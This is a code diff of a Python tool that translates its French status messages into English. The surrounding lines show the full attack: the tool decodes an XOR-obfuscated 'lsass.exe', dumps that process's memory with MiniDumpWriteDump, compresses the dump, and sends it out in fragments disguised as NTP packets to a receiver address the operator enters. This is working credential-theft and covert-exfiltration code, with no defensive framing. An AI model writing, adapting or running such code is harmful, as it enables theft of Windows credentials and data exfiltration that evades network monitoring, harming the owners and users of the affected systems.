@@ -70,7 +70,7 @@ def dump_process_to_memory(pid):
     PROCESS_VM_READ = 0x0010
     process_handle = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
     if not process_handle:
-        print("[!] Échec de l'ouverture du processus.")
+        print("[!] Failed to open the process.")
         return None
 
     PAGE_READWRITE = 0x04
@@ -82,21 +82,21 @@ def dump_process_to_memory(pid):
     memory_file = k32.CreateFileMappingW(ctypes.wintypes.HANDLE(INVALID_HANDLE_VALUE),
                                           None, PAGE_READWRITE, 0, dump_size, None)
     if not memory_file:
-        print("[!] Échec de la création du mapping mémoire.")
+        print("[!] Failed to create file mapping.")
         k32.CloseHandle(process_handle)
         return None
 
     k32.MapViewOfFile.restype = ctypes.c_void_p
     buffer_ptr = k32.MapViewOfFile(memory_file, FILE_MAP_WRITE, 0, 0, dump_size)
     if not buffer_ptr:
-        print("[!] Échec du mapping de la vue du fichier.")
+        print("[!] Failed to map view of file.")
         k32.CloseHandle(memory_file)
         k32.CloseHandle(process_handle)
         return None
 
     MiniDumpWithFullMemory = 0x00000002
     if not MiniDumpWriteDump(process_handle, pid, memory_file, MiniDumpWithFullMemory, None, None, None):
-        print("[!] MiniDumpWriteDump a échoué.")
+        print("[!] MiniDumpWriteDump failed.")
         k32.UnmapViewOfFile(buffer_ptr)
         k32.CloseHandle(memory_file)
         k32.CloseHandle(process_handle)
@@ -115,7 +115,7 @@ def compress_buffer(input_buffer):
     try:
         return zlib.compress(input_buffer)
     except Exception as e:
-        print(f"[!] Erreur lors de la compression : {e}")
+        print(f"[!] Compression error: {e}")
         return None
 
 def send_compressed_dump_as_ntp(target_ip: str, target_port: int, compressed_data: bytes):
@@ -135,7 +135,7 @@ def send_compressed_dump_as_ntp(target_ip: str, target_port: int, compressed_dat
     # Envoi du paquet header
     header_payload = total_fragments.to_bytes(4, byteorder='big') + total_size.to_bytes(4, byteorder='big')
     send_ntp_packet(target_ip, target_port, header_payload)
-    print(f"[+] Header envoyé : {total_fragments} paquets, {total_size} octets au total.")
+    print(f"[+] Header sent: {total_fragments} fragments, {total_size} bytes total.")
 
     # Envoi des paquets de données
     for seq in range(total_fragments):
@@ -145,8 +145,8 @@ def send_compressed_dump_as_ntp(target_ip: str, target_port: int, compressed_dat
         fragment = fragment.ljust(fragment_size, b'\0')
         payload = seq.to_bytes(4, byteorder='big') + fragment
         send_ntp_packet(target_ip, target_port, payload)
-        print(f"[+] Paquet {seq+1}/{total_fragments} envoyé.")
-    print("[+] Transmission terminée.")
+        print(f"[+] Packet {seq+1}/{total_fragments} sent.")
+    print("[+] Transmission completed.")
 
 def main():
     # Obfuscation de "lsass.exe" (chaque caractère XOR avec la clé 0x13)
@@ -156,33 +156,33 @@ def main():
         ord('e') ^ 0x13, ord('x') ^ 0x13, ord('e') ^ 0x13
     ]
     target_process_name = decode_string(encoded_target, 0x13)
-    print(f"[*] Process cible déobfusqué : {target_process_name}")
+    print(f"[*] Decoded target process: {target_process_name}")
 
     # Demande de l'adresse IP et du port du récepteur
-    target_ip = input("[*] Entrez l'IP du récepteur : ").strip()
+    target_ip = input("[*] Enter receiver IP: ").strip()
     try:
-        target_port = int(input("[*] Entrez le port du récepteur : ").strip())
+        target_port = int(input("[*] Enter receiver port: ").strip())
     except ValueError:
-        print("[!] Port invalide.")
+        print("[!] Invalid port.")
         sys.exit(1)
 
     pid = get_target_process_pid(target_process_name)
     if not pid:
-        print("[!] Processus non trouvé.")
+        print("[!] Process not found.")
         sys.exit(1)
-    print(f"[+] Processus {target_process_name} trouvé avec PID {pid}")
+    print(f"[+] Process {target_process_name} found with PID {pid}")
 
     dump_data = dump_process_to_memory(pid)
     if dump_data is None:
-        print("[!] Échec du dump mémoire du processus.")
+        print("[!] Failed to dump process memory.")
         sys.exit(1)
-    print(f"[+] Dump mémoire réalisé. Taille : {len(dump_data)} octets.")
+    print(f"[+] Memory dump completed. Size: {len(dump_data)} bytes.")
 
     compressed_data = compress_buffer(dump_data)
     if compressed_data is None:
-        print("[!] La compression a échoué.")
+        print("[!] Compression failed.")
         sys.exit(1)
-    print(f"[+] Compression réussie. Taille compressée : {len(compressed_data)} octets.")
+    print(f"[+] Compression successful. Compressed size: {len(compressed_data)} bytes.")
 
     send_compressed_dump_as_ntp(target_ip, target_port, compressed_data)
 
